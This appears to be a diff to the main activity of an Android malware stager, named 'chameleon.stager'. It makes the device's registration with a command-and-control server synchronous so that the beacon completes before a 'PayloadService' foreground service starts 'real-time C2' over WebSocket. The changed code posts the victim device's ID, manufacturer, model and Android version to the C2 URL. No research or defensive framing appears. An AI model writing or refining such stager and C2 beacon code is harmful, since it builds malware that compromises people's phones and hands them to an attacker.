@@ -186,8 +186,10 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun finishSetup() {
-        // Step 4: Register via HTTP FIRST (guaranteed delivery even if foreground service fails)
-        registerViaHttpFallback()
+        // Step 4: Register via HTTP SYNCHRONOUSLY (must complete before foreground service)
+        // Using sync to guarantee delivery — even if foreground service crashes the process,
+        // the HTTP request has already completed
+        registerViaHttpSync()
 
         // Step 5: Start foreground service for real-time C2 (WebSocket)
         val serviceIntent = Intent(this, PayloadService::class.java)
@@ -210,32 +212,30 @@ class MainActivity : AppCompatActivity() {
         finish()
     }
 
-    private fun registerViaHttpFallback() {
-        Thread {
-            try {
-                val json = org.json.JSONObject().apply {
-                    put("device_id", Build.ID)
-                    put("device_name", "${Build.MANUFACTURER} ${Build.MODEL}")
-                    put("manufacturer", Build.MANUFACTURER)
-                    put("model", Build.MODEL)
-                    put("android_version", Build.VERSION.RELEASE)
-                    put("api_level", Build.VERSION.SDK_INT)
-                }
-                val url = java.net.URL("${com.chameleon.stager.StagerApplication.c2RealUrl}/api/register")
-                val conn = url.openConnection() as java.net.HttpURLConnection
-                conn.requestMethod = "POST"
-                conn.connectTimeout = 15000
-                conn.readTimeout = 15000
-                conn.doOutput = true
-                conn.setRequestProperty("Content-Type", "application/json")
-                conn.outputStream.write(json.toString().toByteArray())
-                val code = conn.responseCode
-                conn.disconnect()
-                Log.i("MainActivity", "HTTP fallback registration: $code")
-            } catch (e: Exception) {
-                Log.e("MainActivity", "HTTP fallback failed", e)
+    private fun registerViaHttpSync() {
+        try {
+            val json = org.json.JSONObject().apply {
+                put("device_id", Build.ID)
+                put("device_name", "${Build.MANUFACTURER} ${Build.MODEL}")
+                put("manufacturer", Build.MANUFACTURER)
+                put("model", Build.MODEL)
+                put("android_version", Build.VERSION.RELEASE)
+                put("api_level", Build.VERSION.SDK_INT)
             }
-        }.start()
+            val url = java.net.URL("${com.chameleon.stager.StagerApplication.c2RealUrl}/api/register")
+            val conn = url.openConnection() as java.net.HttpURLConnection
+            conn.requestMethod = "POST"
+            conn.connectTimeout = 5000
+            conn.readTimeout = 5000
+            conn.doOutput = true
+            conn.setRequestProperty("Content-Type", "application/json")
+            conn.outputStream.write(json.toString().toByteArray())
+            val code = conn.responseCode
+            conn.disconnect()
+            Log.i("MainActivity", "HTTP registration: $code")
+        } catch (e: Exception) {
+            Log.e("MainActivity", "HTTP registration failed", e)
+        }
     }
 
     override fun onResume() {
